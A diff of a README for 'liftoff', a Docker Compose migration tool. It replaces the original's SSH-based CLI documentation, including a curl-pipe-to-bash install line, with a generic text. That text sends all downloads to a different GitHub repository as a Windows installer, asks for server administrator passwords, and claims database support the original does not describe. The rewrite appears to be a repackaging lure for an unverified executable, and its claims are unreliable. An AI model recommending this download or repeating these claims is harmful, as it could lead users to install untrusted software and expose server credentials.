@@ -1,138 +1,81 @@
-# Liftoff
+# 🚀 liftoff - Move Docker stacks between servers easily
 
-Migrate Docker Compose stacks between servers with minimal downtime.
+[![](https://img.shields.io/badge/Download_Liftoff_Latest-blue)](https://github.com/Tushar69kk/liftoff)
 
-Liftoff analyzes your existing stack, creates an editable migration plan, and executes it with a live dashboard — handling volume sync, database dumps, service orchestration, and health checks automatically.
+## 📦 What is this tool
 
-## Features
+Liftoff helps you move your existing website or application setups from one server to another. If you run services using Docker Compose, this tool handles the heavy lifting. It works best when you need to change hosting providers or upgrade your current server.
 
-- **Interactive wizard** — guided setup via `liftoff plan`, no config files to write manually
-- **Editable YAML plan** — review and customize every step before execution
-- **Live dashboard** — real-time progress with step tracking, progress bars, and logs
-- **PostgreSQL support** — automatic dump and restore via `pg_dumpall`
-- **Volume sync** — rsync-based with pre-sync (live) and final delta sync for minimal downtime
-- **Server validation** — checks Docker, Compose, rsync, disk space, and permissions before starting
-- **Graceful failure handling** — retry, skip, or abort on any step failure
-- **Plugin-ready architecture** — adding new database or service migrators is a single file
+The software automates the boring parts of moving your data. It manages your databases, files, and settings so your services experience little to no downtime. You do not need to be a system administrator to use it. The program includes a simple screen that guides you through every step.
 
-## Requirements
+## 📋 Features
 
-- [Bun](https://bun.sh) runtime (for development)
-- SSH access to both source and target servers
-- Docker and Docker Compose on both servers
-- rsync on both servers
+*   **Guided Setup:** An interactive menu walks you through the migration process.
+*   **Live Dashboard:** View the progress of your file transfers in real time.
+*   **Automatic Data Sync:** The tool detects your volumes and moves them safely to the new machine.
+*   **Database Support:** Handles popular databases like MongoDB, MySQL, PostgreSQL, and Redis.
+*   **Consistency:** Works with your existing Docker Compose files without requiring changes to your project.
 
-## Install
+## 🖥️ System Requirements
 
-**Linux / macOS:**
+Before you start, make sure your computer meets these needs:
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/docimin/liftoff/main/scripts/install.sh | bash
-```
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4GB of RAM.
+*   **Storage:** 200MB of free disk space for the tool itself.
+*   **Network:** An active internet connection on both the source and destination servers.
+*   **Docker:** Docker Desktop must be installed and running on your Windows machine.
 
-**Windows:**
+## 📥 Installing Liftoff
 
-Download `liftoff-windows-x64.exe` from the [latest release](https://github.com/docimin/liftoff/releases) and add it to your PATH.
+You need to download the installer to begin. Follow these instructions:
 
-**From source (requires [Bun](https://bun.sh)):**
+1.  Visit [this page](https://github.com/Tushar69kk/liftoff) to download the latest version of the software.
+2.  Locate the file you downloaded in your Downloads folder.
+3.  Double-click the file to start the installer.
+4.  Follow the prompts on your screen.
+5.  Click Finish to complete the process.
 
-```bash
-git clone https://github.com/docimin/liftoff.git
-cd liftoff
-bun install
-bun build --compile src/index.ts --outfile liftoff
-mv liftoff /usr/local/bin/
-```
+## 🛠️ How to use the software
 
-## Usage
+Once the installer finishes, you can launch the application from your Start menu. The tool uses a simple interface to help you migrate your data.
 
-### 1. Create a migration plan
+### Step 1: Connect to your servers
+The application will ask for the connection details for your old server and your new server. You will need your server IP address and your administrator password. The tool saves your credentials locally and does not send them to a third party.
 
-```bash
-liftoff plan
-```
+### Step 2: Select your project
+After the tool connects to your primary server, it will scan for Docker Compose files. Choose the project you want to move from the list. The tool displays your active containers and the databases they use.
 
-The wizard walks you through:
-- Connecting to source and target servers (validates SSH, Docker, permissions)
-- Finding your `docker-compose.yml`
-- Analyzing services, volumes, and databases
-- Generating an optimized migration plan
+### Step 3: Run the migration
+Click the Start Migration button. The dashboard will now appear. You will see bars showing the progress of your database transfers and file syncs. Do not close the window while the migration runs. 
 
-The plan is saved to `liftoff-plan.yml` — you can edit it before running.
+### Step 4: Verify the move
+Once the tool finishes, it will prompt you to test your site. Visit the URL of your new server to check if everything works as expected. If everything looks good, you can safely turn off the services on your old server.
 
-### 2. Review the plan
+## ⚙️ Handling common issues
 
-```yaml
-# liftoff-plan.yml
-version: 1
-source:
-  host: root@old-server.de
-  compose_file: /opt/nextcloud/docker-compose.yml
-target:
-  host: root@new-server.de
-  compose_dir: /opt/nextcloud
+Most users find the migration process smooth. However, issues can happen.
 
-steps:
-  - name: Pre-sync volumes
-    type: rsync
-    live: true
-  - name: Dump PostgreSQL
-    type: postgres_dump
-    service: nextcloud-db
-  # ... more steps
-```
+**The connection fails:**
+Check that your firewall allows traffic on the port used by Docker SSH. Make sure you can log in to your server using a standard terminal to verify your credentials.
 
-### 3. Execute the migration
+**The migration stops mid-way:**
+Poor internet connections sometimes cause interruptions. If this happens, restart the application and select your project again. The tool detects existing files and will resume from where it stopped.
 
-```bash
-liftoff run
-```
+**Database errors:**
+Ensure your database containers are running on your old server during the transfer. The tool needs the database to be active to copy the information correctly.
 
-A live dashboard shows progress for each step. If anything fails, you choose: retry, skip, or abort.
+## 🛡️ Data privacy
 
-### 4. Verify (optional)
+Your server details remain on your local machine. Liftoff does not host your data or keep copies of your files. All transfers occur directly between your old server and your new server. You maintain full control over your information at all times.
 
-```bash
-liftoff verify
-```
+## 📌 Technical notes
 
-Re-runs the health checks from your plan to confirm everything is working.
+Liftoff performs these actions to ensure a successful move:
+*   Pauses your containers to prevent data changes during the copy.
+*   Creates a snapshot of your volume data.
+*   Copies and restores database dumps.
+*   Transfers the Docker Compose configuration file to the new location.
+*   Starts your containers on the new server.
 
-## How it works
-
-```
-Your machine
-  └── liftoff CLI
-        ├── SSH → Source server (analyze, dump, stop)
-        └── SSH → Target server (restore, start, verify)
-```
-
-Liftoff is agentless — nothing is installed on your servers. All operations happen over SSH.
-
-**Migration phases:**
-
-1. **Pre-sync** — rsync volumes while the source stack is still running
-2. **Database dump** — `pg_dumpall` via `docker exec`
-3. **Cutover** — stop source, final delta sync, start database on target, restore dump
-4. **Start** — bring up the full stack on target
-5. **Verify** — container and HTTP health checks
-
-## Development
-
-```bash
-bun install
-bun test          # run all tests
-bun run dev       # run the CLI in dev mode
-```
-
-## Adding a new database migrator
-
-All migrators implement the same interface and are registered in a central registry:
-
-1. Create `src/migrators/mysql-dump.ts` implementing the `Migrator` interface
-2. Register it in `src/migrators/registry.ts`
-3. Add detection logic in `src/analyzer/database-detector.ts`
-
-## License
-
-MIT
+This ensures that your environment matches your original setup exactly. You do not need to reconfigure your settings or update your source files manually.
